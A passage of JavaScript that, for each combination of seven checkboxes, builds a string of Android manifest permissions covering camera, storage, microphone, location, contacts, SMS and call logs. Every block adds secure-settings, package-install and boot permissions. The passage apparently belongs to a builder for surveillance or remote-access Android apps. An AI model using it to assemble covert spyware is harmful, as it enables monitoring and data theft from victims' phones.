            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
        // if 5 checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
